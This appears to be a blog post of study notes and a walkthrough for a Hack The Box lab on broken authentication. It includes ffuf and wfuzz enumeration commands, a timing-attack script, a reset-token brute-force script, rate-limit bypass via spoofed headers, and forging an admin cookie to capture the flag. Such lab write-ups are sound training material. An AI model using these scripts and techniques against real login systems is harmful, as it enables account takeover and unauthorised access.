---
layout: post
title: Broken Authentication
date: 2024-03-13 11:54 +0000
---
## Default Credentials

Database with default credentials from a huge number of companies: [https://www.cirt.net/passwords]()
Here we have table with credentials from companies: [https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv]()

## Weak Bruteforce Protections

### Captcha

We can try to understand how captcha works and if its developed by the company it may be vulnerable.
Look at parameters like id or how the captcha is placed in the webpage.
Always use a well-tested one and require it after very few failed logins.

### Rate limit

For the rate limit we can add time intervals to our brute force script so it is crucial to understand how much time and when the rate limits will appear.
Most standard rate-limiting implementations that we see nowadays impose a delay after N failed attempts. 

### Insufficient Protections

Things like headers can be trusted by web apps and its a wrong thing to do because they are controlled by the attacker.
We can always change to a browser `User-Agent` or use the header `X-Forwarded-For` with the value `127.0.0.1` to let the application know that we came from inside.

## Brute Forcing Usernames

### User Unknown Attack

Login forms such as the wordpress one discloses whether an username exists when we try to login with a username. If exists they say the password is wrong for that user, if he does not exist then it tells us it does not exist. This is a information disclosure vuln and the same message should be showed in both cases. We can brute force the login form and use the message "user unknown" as a filter to get the right users.

`ffuf -request ~/request_user_q1 -request-proto http  -w ~/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ -fr "Invalid username."`

### Username Existence Inference

Sometimes login forms keep the username as a placeholder if it exists but if not exists they put a default name as the placeholder. It is the same as the User Unknown Attack.

`ffuf -request ~/request_user_q2 -request-proto http  -w ~/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ -w ~/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ2 -fr 'name="wronguser"'`

### Timing Attack

The same query to find the username and password should be used instead of a different query for each field because it can cause a timing vulnerability.
If the user exists it will take more time because it will do two queries, if it does not exists then it does one and its faster.
Script to calculate the time, `python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt`:

```py
import sys
import requests
import os.path

# define target url, change as needed
url = "http://brokenauthentication.hackthebox.eu/login.php"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

    return res.text

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()

```

Note: ffuf provides the time of the request so we dont need to build a script to calculate it: `ffuf -request ~/request_user_q3 -request-proto http -w ~/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ`


### Enumerate through Password Reset

Reset forms are often less well protected than login ones. Therefore, they very often leak information about a valid or invalid username.

### Enumerate through Registration Form

By default, a registration form that prompts users to choose their username usually replies with a clear message when the selected username already exists.
One interesting feature of email addresses that many people do not know or do not have ready in mind while testing is sub-addressing. Writing to an email address like `student+htb@hackthebox.eu` will deliver the email to `student@hackthebox.eu` and, if filters are supported and properly configured, will be placed in folder htb. We can register a lot of accounts with the same email address

```
ffuf -request ~/request_user_q4 -request-proto http -w ~/SecLists/Usernames/top-usernames-shortlist.txt:FUZZ -fr "Thanks for registering, you should receive an email with a confirmation code shortly."
```


### Predictable Usernames

While uncommon, you may run into accounts like `user1000`, `user1001`. It is also possible that "administrative" users have a predictable naming convention, like `support.it`, `support.fr`, or similar. An attacker could infer the algorithm used to create users (incremental four digits, country code, etc.) and guess existing user accounts starting from some known ones.



## Password Bruteforce

### Find password policy

Bellow is a list of passwords to try and identify the policy:


| Tried  | Password             | Lower | Upper | Digit | Special | >=8chars | >=20chars |
|--------|----------------------|-------|-------|-------|---------|----------|-----------|
| Yes/No | qwerty               | X     |       |       |         |          |           |
| Yes/No | Qwerty               | X     | X     |       |         |          |           |
| Yes/No | Qwerty1              | X     | X     | X     |         |          |           |
| Yes/No | Qwertyu1             | X     | X     | X     |         | X        |           |
| Yes/No | Qwert1!              | X     | X     | X     | X       |          |           |
| Yes/No | Qwerty1!             | X     | X     | X     | X       | X        |           |
| Yes/No | QWERTY1              |       | X     | X     |         |          |           |
| Yes/No | QWERT1!              |       | X     | X     | X       |          |           |
| Yes/No | QWERTY1!             |       | X     | X     | X       | X        |           |
| Yes/No | Qwerty!              | X     | X     |       | X       |          |           |
| Yes/No | Qwertyuiop12345!@#$% | X     | X     | X     | X       | X        | X         |

After knowing the policy we can use the following commands to get all the passwords from a wordlist that are in the policy:

`$ grep '[[:upper:]]' /home/w0rth/SecLists/Passwords/Leaked-Databases/rockyou-50.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$' | wc -l`

- `[[:upper:]]` find pass with at least one upper case letter
- `[[:lower:]]` find pass with at least one lower case letter
- `^.{8,12}$` find pass with at least 8 letters and 12 max
- `"[]:/?#@\!\$&'()*+,;=%[]"` find pass with special character

`ffuf -request ~/request_password_brute -request-proto http -w ~/SecLists/password_policy.txt:FUZZ -fr "Password doesn't match minimum requirements."`

Since the password needs to have special characters and numbers I added another grep for special characters and numbers:

`grep '[[:upper:]]' ~/SecLists/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '[0-9,]+'` 


## Predictable Reset Token

- A token **doesn't need to contain any information** from the actual user to be validated and should be a pure-random value.
- If the company **does not generate a random token** and instead use the time and username to generate([https://www.cvedetails.com/cve/CVE-2016-0783/]()) we can forge a new one. To get the time we can use the `Date header`.
- Another problem arises when the app does **not remove expired tokens** or **don't check the age of the token**, allowing the attacker to brute force the token with time.
- Another bad practice is **short tokens**. Once we know what is the output of a valid token and an invalid token we can use `ffuf`or `wfuzz` to brute force the token filtering with the expected output: `wfuzz -z range,00000-99999 --ss "Valid" "https://brokenauthentication.hackthebox.eu/token.php?user=admin&token=FUZZ"`
- Even using a long token it may be generate using a **weak cryptographic algorithm** such as `https://www.php.net/manual/en/function.mt-rand.php`, described [here](https://phpsecurity.readthedocs.io/en/latest/Insufficient-Entropy-For-Random-Values.html). Developers shouldn't never developed their own crypto algorithm and should always use standard ones. For proof of concept attacks [here](https://github.com/GeorgeArgyros/Snowflake) and [here](https://download.openwall.net/pub/projects/php_mt_seed/).
- Finally another bad implementation is using **reset tokens as temp passwords**. Any temporary password should be invalidated as soon as the user logs in and changes it. There are higher chances that temporary passwords are being generated using a predictable algorithm like mt_rand(), md5(username), etc., so make sure you test the algorithm’s security by analyzing some captured tokens.
- Bellow is an example of a script for bruteforcing a reset token:

```py
from hashlib import md5
import requests
from sys import exit
import time

url = "http://94.237.54.170:39641/question1/"

# to have a wide window try to bruteforce starting from 120seconds ago
now = int(time.time() * 1000)
print(now)
start_time = now - 4000
fail_text  = "Wrong token"
username = "htbadmin"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, now + 1000):
    # get token md5
    md5_token = md5((username + str(x)).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    #print(res.text)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()

``` 


## Guessable Answers

- We discourage the use of security answers because even when an application allows users to choose their questions, answers could still be predictable due to users’ negligence.
- To raise the security level, a web application should keep repeating the first question until the user answers correctly.
- When we find a web application that keeps rotating questions, we should collect them to identify the easiest to brute force and then mount the attack.

## Username Injection

- In some web apps changing password is not a linear thing and can become complex and vulnerable. If a web app lets other privilege users change a password for another user, it may check the userid of the privilege user before it checks for the userid in the session.
- In order to exploit this logic we need to specify a field, in this case `userid`, in order to change the password of the privileged userid like: `oldpasswd=htbuser1&newpasswd=htbuser1&confirm=htbuser1&userid=htbadmin&submit=doreset`
- This vulnerability is called **Mass Assignment**

## Brute Forcing Cookies

- Cookies can store important information about the user and sometimes in a bad way. If information is simply encoded and put in the cookie we can use cyber chef to automatically decode the cookie, change the values and set the new cookie. If role/privilege is inside the cookie and we can change the value, we might escalate privileges.
- Remember me cookies typically have a bigger expired date and are the best to brute force.
- If we notice that the token is short we can combine john with a fuzzer tool to brute force the cookie like: `john --incremental=LowerNum --min-length=6 --max-length=6 --stdout| wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://brokenauthentication.hackthebox.eu/profile.php `

## Insecure Token Handling

- Token Lifetime: Each should have a short expiry date and should be deleted after the user logout. 
- Session Fixation: Once a user changes privileges the cookie should be different otherwise it will be vulnerable to session fixation.
- Token in URL: If a token is used in the url, when browsing to an attacker website, it may be in the Referer header which contains typically the url of the previous website. Watch out for a weak config of `Referer-Policy` header

## Skill Assessment

Get the user password policy:

- The password must start with a capital letter
- The password must end with a digit
- The password must contain at least one special char: $ # @
- The password must contain at least one lowercase
- The password is shorter than 20 characters

Extract every valid password from rockyou.txt

`cat /usr/share/wordlists/rockyou.txt | grep -E '^.{20,100}$' | grep -E '^[A-Z].*' | grep -E '.*[0-9]$' | grep -E '[$,#,@]+' | grep -E '[a-z]+' > possible_pass.txt`

```shell
Kirapandora.,.,despierten91238
IuBitzik@_B3b3_&*%1990
TrillPrincessMentality#1
Sn@tch01159552520096
Ninglove_ruk_skn@hotmail.comday170526180127
Mustang#firebird1995
Mi$un'sbrthd8iz12256
Kaalyah,Jarren,Desmond,Terence#1
KAEW_ST@hotmail.com20051986
GG_AF_In_LOVE@hotmail.com0843771156
Blessedbe1@endofritual2
BisocaBuzau#20061985
Barrackpore.1998@05,1411
B@BYme&my$exiness123
ABCDefgh@BungurBaru17
```

Found every support tlds:

`ffuf -request ~/request_final_broken -request-proto http -w ~/SecLists/Discovery/DNS/tlds.txt:FUZZ  -fr "user not found"`

If we try to find support users with tlds we get:
```
.cn                     [Status: 200, Size: 1487, Words: 91, Lines: 43, Duration: 118ms]
.gr                     [Status: 200, Size: 1487, Words: 91, Lines: 43, Duration: 188ms]
.it                     [Status: 200, Size: 1487, Words: 91, Lines: 43, Duration: 252ms]
.uk                     [Status: 200, Size: 1487, Words: 91, Lines: 43, Duration: 100ms]
.us                     [Status: 200, Size: 1487, Words: 91, Lines: 43, Duration: 81ms]
```
Since the login has a rate limit, lets build a script to bypass it:
```
[*] Credentials found: user -> support.us pass -> Mustang#firebird1995
[*] Credentials found: user -> support.it pass -> Mustang#firebird1995
[*] Credentials found: user -> support.cn pass -> BisocaBuzau#20061985
```
Once we get in with one of the accounts and look at the cookie we have the following:
`username:role` -> `support.us:support` -> `af6172da1f353a9b9bbbaac3ac1ed4c4:434990c8a25d2be94863561ae98bd682`(md5)

But got nowhere..

Lets find admins: `ffuf -request ~/request_final_broken_admin -request-proto http -w ~/SecLists/Discovery/DNS/tlds.txt:FUZZ  -fr "user not found"`

We get: 
.cn                     [Status: 200, Size: 1485, Words: 91, Lines: 43, Duration: 109ms]
.gr                     [Status: 200, Size: 1485, Words: 91, Lines: 43, Duration: 148ms]
.it                     [Status: 200, Size: 1485, Words: 91, Lines: 43, Duration: 89ms]
.uk                     [Status: 200, Size: 1485, Words: 91, Lines: 43, Duration: 94ms]
.us                     [Status: 200, Size: 1485, Words: 91, Lines: 43, Duration: 124ms]

Tried the admin users with the password but found none.
Lets try to use the admin users inside the cookies.
Trying `admin.cn:admin` -> `81a73eb40ce50ae1ac0eaa31bb2a5714:21232f297a57a5a743894a0e4a801fc3`(md5) -> `ODFhNzNlYjQwY2U1MGFlMWFjMGVhYTMxYmIyYTU3MTQ6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D`(base64) 

We finally get the flag!!